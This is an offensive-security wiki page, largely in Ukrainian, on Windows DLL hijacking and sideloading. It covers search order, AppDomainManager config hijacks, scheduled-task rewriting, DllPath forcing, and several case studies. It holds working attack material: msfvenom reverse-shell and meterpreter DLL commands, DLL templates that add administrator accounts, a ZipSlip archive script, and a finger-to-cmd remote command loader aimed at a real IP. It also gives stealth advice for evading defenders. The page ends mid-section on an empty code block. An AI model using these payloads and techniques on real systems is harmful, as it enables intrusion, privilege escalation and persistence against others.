# Dll Hijacking

{{#include ../../../banners/hacktricks-training.md}}


## Basic Information

DLL Hijacking передбачає маніпулювання довіреним застосунком, щоб він завантажив шкідливий DLL. Цей термін охоплює кілька тактик, як-от **DLL Spoofing, Injection, and Side-Loading**. Його головним чином використовують для виконання коду, досягнення persistence і, рідше, privilege escalation. Попри фокус на escalation тут, метод hijacking залишається незмінним для всіх цілей.

### Common Techniques

Для DLL hijacking застосовують кілька методів, і ефективність кожного залежить від стратегії завантаження DLL у застосунку:

1. **DLL Replacement**: Підміна справжнього DLL на шкідливий, за потреби з використанням DLL Proxying, щоб зберегти функціональність оригінального DLL.
2. **DLL Search Order Hijacking**: Розміщення шкідливого DLL у шляху пошуку раніше за легітимний, використовуючи pattern пошуку застосунку.
3. **Phantom DLL Hijacking**: Створення шкідливого DLL для завантаження застосунком, який вважає його неіснуючим потрібним DLL.
4. **DLL Redirection**: Зміна параметрів пошуку, як-от `%PATH%` або файлів `.exe.manifest` / `.exe.local`, щоб спрямувати застосунок на шкідливий DLL.
5. **WinSxS DLL Replacement**: Підміна легітимного DLL на шкідливий аналог у каталозі WinSxS, метод, який часто пов’язують із DLL side-loading.
6. **Relative Path DLL Hijacking**: Розміщення шкідливого DLL у каталозі під контролем користувача разом із скопійованим застосунком, що нагадує техніки Binary Proxy Execution.


### AppDomainManager hijacking (`<exe>.config` + attacker assembly)

Classic DLL sideloading — це не єдиний спосіб змусити довірений процес **.NET Framework** завантажити attacker code. Якщо цільовий executable є **managed** застосунком, CLR також перевіряє **application configuration file** з назвою, що відповідає executable (наприклад `Setup.exe.config`). У цьому файлі можна визначити custom **AppDomainManager**. Якщо config вказує на attacker-controlled assembly, розміщений поруч із EXE, CLR завантажує його **before the application's normal code path** і запускає всередині довіреного процесу.

Згідно зі schema конфігурації .NET Framework від Microsoft, для використання custom manager мають бути присутні і `<appDomainManagerAssembly>`, і `<appDomainManagerType>`.

Minimal config:
```xml
<configuration>
<runtime>
<appDomainManagerAssembly value="EvilMgr, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null" />
<appDomainManagerType value="EvilMgr.Loader" />
</runtime>
</configuration>
```
Minimal manager:
```csharp
using System; using System.Runtime.InteropServices;
public sealed class Loader : AppDomainManager {
[DllImport("user32.dll")] static extern int MessageBox(IntPtr h, string t, string c, int m);
public override void InitializeNewDomain(AppDomainSetup appDomainInfo) {
MessageBox(IntPtr.Zero, "Loaded inside trusted .NET host", "AppDomain hijack", 0);
}
}
```
Практичні примітки:
- Це tradecraft, специфічний для **.NET Framework**. Він залежить від розбору конфігурації CLR, а не від порядку пошуку Win32 DLL.
- Хост має бути справді **managed EXE**. Швидка перевірка: `sigcheck -m target.exe`, `corflags target.exe`, або перевірка наявності **CLR Runtime Header** у PE metadata.
- Ім’я файлу конфігурації має точно збігатися з ім’ям executable (`<binary>.config`) і зазвичай лежить **поруч із EXE**.
- Це корисно з **signed Microsoft/vendor binaries**, тому що trusted EXE лишається незмінним, тоді як malicious managed assembly виконується в тому ж процесі.
- Якщо у вас уже є writable installer/update directory, AppDomainManager hijacking можна використати як **first stage**, а потім — classic DLL sideloading або reflective loading для наступних stages.

### Hijacking an existing scheduled task to relaunch the sideload chain

Для persistence не шукайте лише **створення нового task**. Деякі intrusion sets чекають, поки legitimate installer створить **normal updater task**, а потім **переписують task action**, щоб наявні name, author і trigger залишалися знайомими для defenders.

Reusable workflow:
1. Встановіть/запустіть legitimate software і визначте task, який він зазвичай створює.
2. Експортуйте task XML і зафіксуйте поточні значення `<Exec><Command>` / `<Arguments>`.
3. Замініть лише action так, щоб task запускав ваш **trusted host EXE** з user-writable staging directory, а він уже side-load або AppDomain-load робив реальний payload.
4. Перереєструйте той самий task name замість створення нового очевидного persistence artifact.
```cmd
schtasks /query /tn "<TaskName>" /xml > task.xml
:: edit the <Exec><Command> and optional <Arguments> nodes
schtasks /create /tn "<TaskName>" /xml task.xml /f
```
Чому це більш приховано:
- Назва task усе ще може виглядати легітимно (наприклад, як updater від vendor).
- **Task Scheduler service** запускає його, тож перевірка parent/ancestor часто бачить очікуваний scheduling chain замість `explorer.exe`.
- DFIR-команди, які полюють лише за **новими task names**, можуть пропустити task, чия registration уже існувала, але чия action тепер вказує на `%LOCALAPPDATA%`, `%APPDATA%` або інший шлях під контролем attacker.

Швидкі hunting pivots:
- `schtasks /query /fo LIST /v | findstr /i "TaskName Task To Run"`
- `Get-ScheduledTask | % { [pscustomobject]@{TaskName=$_.TaskName; TaskPath=$_.TaskPath; Exec=($_.Actions | % Execute)} }`
- Порівнюйте `C:\Windows\System32\Tasks\*` XML і metadata з `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Schedule\TaskCache\Tree\*` з baseline.
- Сигналізуйте, коли **vendor-looking updater task** запускається з **user-writable directories** або стартує .NET EXE з colocated `*.config` file.

> [!TIP]
> Для покрокового chain, який накладає HTML staging, AES-CTR configs і .NET implants поверх DLL sideloading, перегляньте workflow нижче.

{{#ref}}
advanced-html-staged-dll-sideloading.md
{{#endref}}

## Finding missing Dlls

Найпоширеніший спосіб знайти missing Dlls у системі — запустити [procmon](https://docs.microsoft.com/en-us/sysinternals/downloads/procmon) від sysinternals, **встановивши** **2 такі filters**:

![Common Techniques - Finding missing Dlls: The most common way to find missing Dlls inside a system is running procmon from sysinternals, setting the following 2 filters](<../../../images/image (961).png>)

![Common Techniques - Finding missing Dlls: The most common way to find missing Dlls inside a system is running procmon from sysinternals, setting the following 2 filters](<../../../images/image (230).png>)

і показати лише **File System Activity**:

![Common Techniques - Finding missing Dlls: and just show the File System Activity](<../../../images/image (153).png>)

Якщо ви шукаєте **missing dlls загалом**, залиште це запущеним на кілька **seconds**.\
Якщо ви шукаєте **missing dll inside an specific executable**, треба встановити **інший filter, наприклад "Process Name" "contains" `<exec name>`, запустити його і зупинити capture events**.

## Exploiting Missing Dlls

Щоб підвищити privileges, найкращий шанс — це можливість **записати dll, яку privileged process спробує завантажити**, у **місце, де її буде шукати**. Отже, ми зможемо **записати** dll у **folder**, де **dll шукається раніше**, ніж folder з **original dll** (weird case), або зможемо **записати в якийсь folder, де dll буде шукатися**, а оригінальної **dll** не існує в жодному folder.

### Dll Search Order

**У** [**Microsoft documentation**](https://docs.microsoft.com/en-us/windows/win32/dlls/dynamic-link-library-search-order#factors-that-affect-searching) **можна знайти, як саме завантажуються Dlls.**

**Windows applications** шукають DLLs, дотримуючись набору **pre-defined search paths** у певній послідовності. Проблема DLL hijacking виникає, коли шкідливу DLL стратегічно розміщують в одному з цих directories, гарантуючи, що вона завантажиться раніше за справжню DLL. Один зі способів запобігти цьому — змусити application використовувати absolute paths, коли вона звертається до потрібних DLLs.

Нижче наведено **DLL search order on 32-bit** systems:

1. Directory, з якого було завантажено application.
2. System directory. Використовуйте function [**GetSystemDirectory**](https://docs.microsoft.com/en-us/windows/desktop/api/sysinfoapi/nf-sysinfoapi-getsystemdirectorya), щоб отримати path цього directory.(_C:\Windows\System32_)
3. 16-bit system directory. Немає function, яка отримує path цього directory, але його шукають. (_C:\Windows\System_)
4. Windows directory. Використовуйте function [**GetWindowsDirectory**](https://docs.microsoft.com/en-us/windows/desktop/api/sysinfoapi/nf-sysinfoapi-getwindowsdirectorya), щоб отримати path цього directory.
1. (_C:\Windows_)
5. Current directory.
6. Directories, перелічені в environment variable PATH. Зверніть увагу, що це не включає per-application path, вказаний у registry key **App Paths**. Key **App Paths** не використовується під час обчислення DLL search path.

Це **default** search order із увімкненим **SafeDllSearchMode**. Коли його вимкнено, current directory піднімається на друге місце. Щоб вимкнути цю feature, створіть registry value **HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\Session Manager**\\**SafeDllSearchMode** і встановіть його в 0 (default — enabled).

Якщо function [**LoadLibraryEx**](https://docs.microsoft.com/en-us/windows/desktop/api/LibLoaderAPI/nf-libloaderapi-loadlibraryexa) викликається з **LOAD_WITH_ALTERED_SEARCH_PATH**, пошук починається в directory executable module, який **LoadLibraryEx** завантажує.

Нарешті, зверніть увагу, що **dll можна завантажити, вказавши absolute path, а не лише name**. У такому разі ця dll **буде шукатися лише за цим path** (якщо в dll є dependencies, їх шукатимуть так, ніби вони були завантажені лише за name).

Є й інші способи змінювати search order, але я не буду пояснювати їх тут.

### Chaining an arbitrary file write into a missing-DLL hijack

1. Використайте filters **ProcMon** (`Process Name` = target EXE, `Path` закінчується на `.dll`, `Result` = `NAME NOT FOUND`), щоб зібрати DLL names, які process запитує, але не знаходить.
2. Якщо binary запускається за **schedule/service**, то розміщення DLL з одним із цих names у **application directory** (search-order entry #1) призведе до її завантаження під час наступного execution. В одному випадку з .NET scanner process шукав `hostfxr.dll` у `C:\samples\app\` перед тим, як завантажити справжню копію з `C:\Program Files\dotnet\fxr\...`.
3. Зберіть payload DLL (наприклад, reverse shell) з будь-яким export: `msfvenom -p windows/x64/shell_reverse_tcp LHOST=<attacker_ip> LPORT=443 -f dll -o hostfxr.dll`.
4. Якщо ваша primitive — це **ZipSlip-style arbitrary write**, створіть ZIP, entry якого виходить за межі extraction dir, щоб DLL потрапила в app folder:
```python
import zipfile
with zipfile.ZipFile("slip-shell.zip", "w") as z:
z.writestr("../app/hostfxr.dll", open("hostfxr.dll","rb").read())
```
5. Доставте архів до відстежуваної скриньки/шари; коли запланована задача повторно запустить процес, він завантажить malicious DLL і виконає ваш code під обліковим записом service.

### Примусове sideloading через RTL_USER_PROCESS_PARAMETERS.DllPath

Просунутий спосіб детерміновано вплинути на шлях пошуку DLL для щойно створеного process — встановити поле DllPath у RTL_USER_PROCESS_PARAMETERS під час створення process за допомогою native APIs з ntdll. Якщо вказати тут каталог, контрольований attacker, то target process, який розв’язує imported DLL за назвою (без absolute path і без використання safe loading flags), можна змусити завантажити malicious DLL із цього каталогу.

Key idea
- Побудуйте process parameters за допомогою RtlCreateProcessParametersEx і вкажіть custom DllPath, який веде до вашої контрольованої папки (наприклад, директорії, де знаходиться ваш dropper/unpacker).
- Створіть process за допомогою RtlCreateUserProcess. Коли target binary розв’язує DLL за назвою, loader звернеться до цього наданого DllPath під час resolution, що дає змогу надійно виконати sideloading навіть тоді, коли malicious DLL не знаходиться поруч із target EXE.

Notes/limitations
- Це впливає на child process, який створюється; це відрізняється від SetDllDirectory, яка впливає лише на current process.
- Target має import або LoadLibrary DLL за назвою (без absolute path і без використання LOAD_LIBRARY_SEARCH_SYSTEM32/SetDefaultDllDirectories).
- KnownDLLs і жорстко задані absolute paths не можна hijack. Forwarded exports і SxS можуть змінювати precedence.

Minimal C example (ntdll, wide strings, simplified error handling):

<details>
<summary>Full C example: forcing DLL sideloading via RTL_USER_PROCESS_PARAMETERS.DllPath</summary>
```c
#include <windows.h>
#include <winternl.h>
#pragma comment(lib, "ntdll.lib")

// Prototype (not in winternl.h in older SDKs)
typedef NTSTATUS (NTAPI *RtlCreateProcessParametersEx_t)(
PRTL_USER_PROCESS_PARAMETERS *pProcessParameters,
PUNICODE_STRING ImagePathName,
PUNICODE_STRING DllPath,
PUNICODE_STRING CurrentDirectory,
PUNICODE_STRING CommandLine,
PVOID Environment,
PUNICODE_STRING WindowTitle,
PUNICODE_STRING DesktopInfo,
PUNICODE_STRING ShellInfo,
PUNICODE_STRING RuntimeData,
ULONG Flags
);

typedef NTSTATUS (NTAPI *RtlCreateUserProcess_t)(
PUNICODE_STRING NtImagePathName,
ULONG Attributes,
PRTL_USER_PROCESS_PARAMETERS ProcessParameters,
PSECURITY_DESCRIPTOR ProcessSecurityDescriptor,
PSECURITY_DESCRIPTOR ThreadSecurityDescriptor,
HANDLE ParentProcess,
BOOLEAN InheritHandles,
HANDLE DebugPort,
HANDLE ExceptionPort,
PRTL_USER_PROCESS_INFORMATION ProcessInformation
);

static void DirFromModule(HMODULE h, wchar_t *out, DWORD cch) {
DWORD n = GetModuleFileNameW(h, out, cch);
for (DWORD i=n; i>0; --i) if (out[i-1] == L'\\') { out[i-1] = 0; break; }
}

int wmain(void) {
// Target Microsoft-signed, DLL-hijackable binary (example)
const wchar_t *image = L"\\??\\C:\\Program Files\\Windows Defender Advanced Threat Protection\\SenseSampleUploader.exe";

// Build custom DllPath = directory of our current module (e.g., the unpacked archive)
wchar_t dllDir[MAX_PATH];
DirFromModule(GetModuleHandleW(NULL), dllDir, MAX_PATH);

UNICODE_STRING uImage, uCmd, uDllPath, uCurDir;
RtlInitUnicodeString(&uImage, image);
RtlInitUnicodeString(&uCmd, L"\"C:\\Program Files\\Windows Defender Advanced Threat Protection\\SenseSampleUploader.exe\"");
RtlInitUnicodeString(&uDllPath, dllDir);      // Attacker-controlled directory
RtlInitUnicodeString(&uCurDir, dllDir);

RtlCreateProcessParametersEx_t pRtlCreateProcessParametersEx =
(RtlCreateProcessParametersEx_t)GetProcAddress(GetModuleHandleW(L"ntdll.dll"), "RtlCreateProcessParametersEx");
RtlCreateUserProcess_t pRtlCreateUserProcess =
(RtlCreateUserProcess_t)GetProcAddress(GetModuleHandleW(L"ntdll.dll"), "RtlCreateUserProcess");

RTL_USER_PROCESS_PARAMETERS *pp = NULL;
NTSTATUS st = pRtlCreateProcessParametersEx(&pp, &uImage, &uDllPath, &uCurDir, &uCmd,
NULL, NULL, NULL, NULL, NULL, 0);
if (st < 0) return 1;

RTL_USER_PROCESS_INFORMATION pi = {0};
st = pRtlCreateUserProcess(&uImage, 0, pp, NULL, NULL, NULL, FALSE, NULL, NULL, &pi);
if (st < 0) return 1;

// Resume main thread etc. if created suspended (not shown here)
return 0;
}
```
</details>

Приклад використання в операціях
- Place a malicious xmllite.dll (експортує потрібні функції або proxying до real one) у вашому DllPath directory.
- Запустіть signed binary, який, як відомо, шукає xmllite.dll за name, використовуючи описану вище technique. loader resolve-ить import через наданий DllPath і sideload-ить ваш DLL.

Цю technique спостерігали in-the-wild для побудови multi-stage sideloading chains: початковий launcher скидає helper DLL, який потім запускає Microsoft-signed, hijackable binary з custom DllPath, щоб примусово завантажити DLL attacker-а з staging directory.


#### Exceptions on dll search order from Windows docs

У документації Windows зазначено певні exceptions до стандартного DLL search order:

- Коли зустрічається **DLL that shares its name with one already loaded in memory**, система обходить звичний search. Замість цього вона виконує check для redirection і manifest before defaulting to the DLL already in memory. **In this scenario, the system does not conduct a search for the DLL**.
- У випадках, коли DLL розпізнається як **known DLL** для поточної версії Windows, система використовуватиме її версію known DLL, разом із будь-якими її dependent DLLs, **forgoing the search process**. Registry key **HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Session Manager\KnownDLLs** містить список цих known DLLs.
- Якщо **DLL має dependencies**, пошук цих dependent DLLs виконується так, ніби їх було вказано лише за їхніми **module names**, незалежно від того, чи було початкову DLL визначено через full path.

### Escalating Privileges

**Requirements**:

- Identify a process that operates or will operate under **different privileges** (horizontal or lateral movement), which is **lacking a DLL**.
- Ensure **write access** is available for any **directory** in which the **DLL** will be **searched for**. This location might be the directory of the executable or a directory within the system path.

Так, вимоги складні для пошуку, оскільки **by default it's kind of weird to find a privileged executable missing a dll** і ще **more weird to have write permissions on a system path folder** (за замовчуванням це неможливо). Але в misconfigured environments це можливо.\
Якщо вам пощастить і ви зможете виконати вимоги, ви можете перевірити проєкт [UACME](https://github.com/hfiref0x/UACME). Навіть якщо **main goal of the project is bypass UAC**, там можна знайти **PoC** Dll hijaking для Windows version, який можна використати (ймовірно, просто змінивши path папки, де у вас є write permissions).

Зверніть увагу, що ви можете **check your permissions in a folder** так:
```bash
accesschk.exe -dqv "C:\Python27"
icacls "C:\Python27"
```
І **перевірте permissions усіх папок усередині PATH**:
```bash
for %%A in ("%path:;=";"%") do ( cmd.exe /c icacls "%%~A" 2>nul | findstr /i "(F) (M) (W) :\" | findstr /i ":\\ everyone authenticated users todos %username%" && echo. )
```
Також ви можете перевірити imports виконуваного файлу та exports dll за допомогою:
```bash
dumpbin /imports C:\path\Tools\putty\Putty.exe
dumpbin /export /path/file.dll
```
For a full guide on how to **abuse Dll Hijacking to escalate privileges** with permissions to write in a **System Path folder** check:


{{#ref}}
writable-sys-path-dll-hijacking-privesc.md
{{#endref}}

### Automated tools

[**Winpeas** ](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)will check if you have write permissions on any folder inside system PATH.\
Other interesting automated tools to discover this vulnerability are **PowerSploit functions**: _Find-ProcessDLLHijack_, _Find-PathDLLHijack_ and _Write-HijackDll._

### Example

In case you find an exploitable scenario one of the most important things to successfully exploit it would be to **create a dll that exports at least all the functions the executable will import from it**. Anyway, note that Dll Hijacking comes handy in order to [escalate from Medium Integrity level to High **(bypassing UAC)**](../../authentication-credentials-uac-and-efs/index.html#uac) or from[ **High Integrity to SYSTEM**](../index.html#from-high-integrity-to-system)**.** You can find an example of **how to create a valid dll** inside this dll hijacking study focused on dll hijacking for execution: [**https://www.wietzebeukema.nl/blog/hijacking-dlls-in-windows**](https://www.wietzebeukema.nl/blog/hijacking-dlls-in-windows)**.**\
Moreover, in the **next sectio**n you can find some **basic dll codes** that might be useful as **templates** or to create a **dll with non required functions exported**.

## **Creating and compiling Dlls**

### **Dll Proxifying**

Basically a **Dll proxy** is a Dll capable of **execute your malicious code when loaded** but also to **expose** and **work** as **exected** by **relaying all the calls to the real library**.

With the tool [**DLLirant**](https://github.com/redteamsocietegenerale/DLLirant) or [**Spartacus**](https://github.com/Accenture/Spartacus) you can actually **indicate an executable and select the library** you want to proxify and **generate a proxified dll** or **indicate the Dll** and **generate a proxified dll**.

### **Meterpreter**

**Get rev shell (x64):**
```bash
msfvenom -p windows/x64/shell/reverse_tcp LHOST=192.169.0.100 LPORT=4444 -f dll -o msf.dll
```
**Отримати meterpreter (x86):**
```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.169.0.100 LPORT=4444 -f dll -o msf.dll
```
**Створити користувача (x86, я не бачив версії x64):**
```bash
msfvenom -p windows/adduser USER=privesc PASS=Attacker@123 -f dll -o msf.dll
```
### Your own

Зверніть увагу, що в кількох випадках Dll, який ви компілюєте, має **експортувати кілька функцій**, які будуть завантажені процесом жертви; якщо цих функцій не існує, **binary не зможе їх завантажити**, і **exploit зазнає невдачі**.

<details>
<summary>C DLL template (Win10)</summary>
```c
// Tested in Win10
// i686-w64-mingw32-g++ dll.c -lws2_32 -o srrstr.dll -shared
#include <windows.h>
BOOL WINAPI DllMain (HANDLE hDll, DWORD dwReason, LPVOID lpReserved){
switch(dwReason){
case DLL_PROCESS_ATTACH:
system("whoami > C:\\users\\username\\whoami.txt");
WinExec("calc.exe", 0); //This doesn't accept redirections like system
break;
case DLL_PROCESS_DETACH:
break;
case DLL_THREAD_ATTACH:
break;
case DLL_THREAD_DETACH:
break;
}
return TRUE;
}
```
</details>
```c
// For x64 compile with: x86_64-w64-mingw32-gcc windows_dll.c -shared -o output.dll
// For x86 compile with: i686-w64-mingw32-gcc windows_dll.c -shared -o output.dll

#include <windows.h>
BOOL WINAPI DllMain (HANDLE hDll, DWORD dwReason, LPVOID lpReserved){
if (dwReason == DLL_PROCESS_ATTACH){
system("cmd.exe /k net localgroup administrators user /add");
ExitProcess(0);
}
return TRUE;
}
```
<details>
<summary>Приклад C++ DLL зі створенням користувача</summary>
```c
//x86_64-w64-mingw32-g++ -c -DBUILDING_EXAMPLE_DLL main.cpp
//x86_64-w64-mingw32-g++ -shared -o main.dll main.o -Wl,--out-implib,main.a

#include <windows.h>

int owned()
{
WinExec("cmd.exe /c net user cybervaca Password01 ; net localgroup administrators cybervaca /add", 0);
exit(0);
return 0;
}

BOOL WINAPI DllMain(HINSTANCE hinstDLL,DWORD fdwReason, LPVOID lpvReserved)
{
owned();
return 0;
}
```
</details>

<details>
<summary>Альтернативний C DLL з entry thread</summary>
```c
//Another possible DLL
// i686-w64-mingw32-gcc windows_dll.c -shared -lws2_32 -o output.dll

#include<windows.h>
#include<stdlib.h>
#include<stdio.h>

void Entry (){ //Default function that is executed when the DLL is loaded
system("cmd");
}

BOOL APIENTRY DllMain (HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved) {
switch (ul_reason_for_call){
case DLL_PROCESS_ATTACH:
CreateThread(0,0, (LPTHREAD_START_ROUTINE)Entry,0,0,0);
break;
case DLL_THREAD_ATTACH:
case DLL_THREAD_DETACH:
case DLL_PROCESS_DEATCH:
break;
}
return TRUE;
}
```
</details>

## Приклад: Narrator OneCore TTS Localization DLL Hijack (Accessibility/ATs)

Windows Narrator.exe і далі під час запуску перевіряє передбачувану, мовно-специфічну localization DLL, яку можна hijack для довільного виконання коду та persistence.

Ключові факти
- Шлях перевірки (поточні збірки): `%windir%\System32\speech_onecore\engines\tts\msttsloc_onecoreenus.dll` (EN-US).
- Legacy path (старіші збірки): `%windir%\System32\speech\engine\tts\msttslocenus.dll`.
- Якщо на OneCore шляху існує DLL, доступна на запис і під контролем attacker, вона завантажується, і виконується `DllMain(DLL_PROCESS_ATTACH)`. Export-и не потрібні.

Виявлення за допомогою Procmon
- Filter: `Process Name is Narrator.exe` and `Operation is Load Image` or `CreateFile`.
- Запустіть Narrator і спостерігайте спробу завантаження вказаного шляху.

Minimal DLL
```c
// Build as msttsloc_onecoreenus.dll and place in the OneCore TTS path
BOOL WINAPI DllMain(HINSTANCE h, DWORD r, LPVOID) {
if (r == DLL_PROCESS_ATTACH) {
// Optional OPSEC: DisableThreadLibraryCalls(h);
// Suspend/quiet Narrator main thread, then run payload
// (see PoC for implementation details)
}
return TRUE;
}
```
OPSEC тиша
- Наївний hijack буде озвучувати/підсвічувати UI. Щоб залишатися тихим, під час attach перелічіть потоки Narrator, відкрийте головний потік (`OpenThread(THREAD_SUSPEND_RESUME)`) і виконайте `SuspendThread` для нього; далі працюйте у власному потоці. Див. PoC для повного коду.

Trigger і persistence через Accessibility configuration
- Контекст користувача (HKCU): `reg add "HKCU\Software\Microsoft\Windows NT\CurrentVersion\Accessibility" /v configuration /t REG_SZ /d "Narrator" /f`
- Winlogon/SYSTEM (HKLM): `reg add "HKLM\Software\Microsoft\Windows NT\CurrentVersion\Accessibility" /v configuration /t REG_SZ /d "Narrator" /f`
- З наведеним вище, запуск Narrator завантажує підкладену DLL. На secure desktop (екран логону) натисніть CTRL+WIN+ENTER, щоб запустити Narrator; ваша DLL виконається як SYSTEM на secure desktop.

RDP-triggered SYSTEM execution (lateral movement)
- Дозвольте classic RDP security layer: `reg add "HKLM\System\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp" /v SecurityLayer /t REG_DWORD /d 0 /f`
- Підключіться по RDP до хоста, на екрані логону натисніть CTRL+WIN+ENTER, щоб запустити Narrator; ваша DLL виконається як SYSTEM на secure desktop.
- Виконання зупиняється, коли RDP session закривається — інжектуйте/мігруйте негайно.

Bring Your Own Accessibility (BYOA)
- Ви можете клонувати вбудований запис реєстру Accessibility Tool (AT) (наприклад, CursorIndicator), відредагувати його так, щоб він вказував на довільний binary/DLL, імпортувати його, а потім встановити `configuration` на ім’я цього AT. Це проксирує довільне виконання в межах framework Accessibility.

Notes
- Запис у `%windir%\System32` і зміна значень HKLM потребують прав admin.
- Уся логіка payload може жити в `DLL_PROCESS_ATTACH`; exports не потрібні.

## Case Study: CVE-2025-1729 - Privilege Escalation Using TPQMAssistant.exe

Цей case study демонструє **Phantom DLL Hijacking** у Lenovo TrackPoint Quick Menu (`TPQMAssistant.exe`), який відстежується як **CVE-2025-1729**.

### Vulnerability Details

- **Component**: `TPQMAssistant.exe`, розташований у `C:\ProgramData\Lenovo\TPQM\Assistant\`.
- **Scheduled Task**: `Lenovo\TrackPointQuickMenu\Schedule\ActivationDailyScheduleTask` запускається щодня о 9:30 AM у контексті користувача, який увійшов у систему.
- **Directory Permissions**: Writable by `CREATOR OWNER`, що дозволяє локальним користувачам скидати довільні файли.
- **DLL Search Behavior**: Першою спробою завантажує `hostfxr.dll` зі своєї working directory і логить "NAME NOT FOUND", якщо файл відсутній, що вказує на пріоритет локального пошуку в директорії.

### Exploit Implementation

Зловмисник може розмістити шкідливий stub `hostfxr.dll` у тій самій директорії, експлуатуючи відсутню DLL, щоб отримати code execution у контексті користувача:
```c
#include <windows.h>

BOOL APIENTRY DllMain(HMODULE hModule, DWORD fdwReason, LPVOID lpReserved) {
if (fdwReason == DLL_PROCESS_ATTACH) {
// Payload: display a message box (proof-of-concept)
MessageBoxA(NULL, "DLL Hijacked!", "TPQM", MB_OK);
}
return TRUE;
}
```
### Attack Flow

1. Як стандартний user, скиньте `hostfxr.dll` у `C:\ProgramData\Lenovo\TPQM\Assistant\`.
2. Зачекайте, поки scheduled task запуститься о 9:30 AM у контексті current user.
3. Якщо під час виконання task в системі залогований administrator, malicious DLL запуститься в session administrator з medium integrity.
4. Складіть стандартні UAC bypass techniques, щоб підвищити привілеї з medium integrity до SYSTEM privileges.

## Case Study: MSI CustomAction Dropper + DLL Side-Loading via Signed Host (wsc_proxy.exe)

Threat actors часто поєднують MSI-based droppers із DLL side-loading, щоб виконувати payloads під trusted, signed process.

Chain overview
- User завантажує MSI. CustomAction silently запускається під час GUI install (наприклад, LaunchApplication або VBScript action), відтворюючи наступний stage з embedded resources.
- Dropper записує legitimate, signed EXE і malicious DLL у той самий directory (приклад: Avast-signed wsc_proxy.exe + attacker-controlled wsc.dll).
- Коли signed EXE запускається, Windows DLL search order спочатку завантажує wsc.dll з working directory, виконуючи attacker code під signed parent (ATT&CK T1574.001).

MSI analysis (what to look for)
- CustomAction table:
- Шукайте entries, які запускають executables або VBScript. Приклад suspicious pattern: LaunchApplication, що виконує embedded file у background.
- В Orca (Microsoft Orca.exe) перевірте CustomAction, InstallExecuteSequence and Binary tables.
- Embedded/split payloads у MSI CAB:
- Administrative extract: `msiexec /a package.msi /qb TARGETDIR=C:\out`
- Або використайте lessmsi: `lessmsi x package.msi C:\out`
- Шукайте multiple small fragments, які concatenated і decrypted by a VBScript CustomAction. Common flow:
```vb
' VBScript CustomAction (high level)
' 1) Read multiple fragment files from the embedded CAB (e.g., f0.bin, f1.bin, ...)
' 2) Concatenate with ADODB.Stream or FileSystemObject
' 3) Decrypt using a hardcoded password/key
' 4) Write reconstructed PE(s) to disk (e.g., wsc_proxy.exe and wsc.dll)
```
Практичний sideloading з wsc_proxy.exe
- Поклади ці два файли в ту саму папку:
- wsc_proxy.exe: легітимний signed host (Avast). Процес намагається завантажити wsc.dll за назвою зі своєї директорії.
- wsc.dll: DLL атакувальника. Якщо не потрібні конкретні exports, достатньо DllMain; інакше створи proxy DLL і перенаправляй потрібні exports до справжньої бібліотеки, запускаючи payload у DllMain.
- Збери мінімальний DLL payload:
```c
// x64: x86_64-w64-mingw32-gcc payload.c -shared -o wsc.dll
#include <windows.h>
BOOL WINAPI DllMain(HINSTANCE h, DWORD r, LPVOID) {
if (r == DLL_PROCESS_ATTACH) {
WinExec("cmd.exe /c whoami > %TEMP%\\wsc_sideload.txt", SW_HIDE);
}
return TRUE;
}
```
- Для вимог export використовуйте proxying framework (наприклад, DLLirant/Spartacus), щоб згенерувати forwarding DLL, яка також виконує ваш payload.

- Ця техніка покладається на DLL name resolution з боку host binary. Якщо host використовує absolute paths або safe loading flags (наприклад, LOAD_LIBRARY_SEARCH_SYSTEM32/SetDefaultDllDirectories), hijack може не спрацювати.
- KnownDLLs, SxS і forwarded exports можуть впливати на precedence і мають бути враховані під час вибору host binary та export set.

## Signed triads + encrypted payloads (ShadowPad case study)

Check Point описала, як Ink Dragon розгортає ShadowPad, використовуючи **three-file triad**, щоб зливатися з legitimate software, зберігаючи core payload encrypted на диску:

1. **Signed host EXE** – зловживають vendor-ами на кшталт AMD, Realtek або NVIDIA (`vncutil64.exe`, `ApplicationLogs.exe`, `msedge_proxyLog.exe`). Attackers перейменовують executable, щоб він виглядав як Windows binary (наприклад, `conhost.exe`), але Authenticode signature лишається valid.
2. **Malicious loader DLL** – скидається поруч із EXE з очікуваною назвою (`vncutil64loc.dll`, `atiadlxy.dll`, `msedge_proxyLogLOC.dll`). DLL зазвичай є MFC binary, обфускований за допомогою ScatterBrain framework; його єдине завдання — знайти encrypted blob, decrypt його і reflectively map ShadowPad.
3. **Encrypted payload blob** – часто зберігається як `<name>.tmp` у тій самій директорії. Після memory-mapping decrypted payload loader видаляє TMP file, щоб знищити forensic evidence.

Tradecraft notes:

* Перейменування signed EXE (зберігаючи оригінальний `OriginalFileName` у PE header) дозволяє йому маскуватися під Windows binary, але зберігати vendor signature, тож відтворюйте звичку Ink Dragon скидати binaries, що виглядають як `conhost.exe`, але насправді є AMD/NVIDIA utilities.
* Оскільки executable лишається trusted, більшість allowlisting controls повинні лише дозволити, щоб ваш malicious DLL лежав поруч із ним. Зосередьтеся на кастомізації loader DLL; signed parent зазвичай може запускатися без змін.
* Decryptor ShadowPad очікує, що TMP blob буде поруч із loader і writable, щоб після mapping можна було обнулити file. Тримайте directory writable, доки payload не завантажиться; після потрапляння в memory TMP file можна безпечно видалити для OPSEC.

### LOLBAS stager + staged archive sideloading chain (finger → tar/curl → WMI)

Operators поєднують DLL sideloading із LOLBAS, тож єдиний custom artifact на диску — malicious DLL поруч із trusted EXE:

- **Remote command loader (Finger):** Hidden PowerShell запускає `cmd.exe /c`, отримує commands з Finger server і передає їх у `cmd`:

```powershell
powershell.exe Start-Process cmd -ArgumentList '/c finger Galo@91.193.19.108 | cmd' -WindowStyle Hidden
```
- `finger user@host` отримує TCP/79 text; `| cmd` виконує server response, дозволяючи operators змінювати second stage server-side.

- **Built-in download/extract:** Завантажте archive з benign extension, розпакуйте його і підготуйте sideload target разом із DLL у випадковій теці `%LocalAppData%`:

```powershell
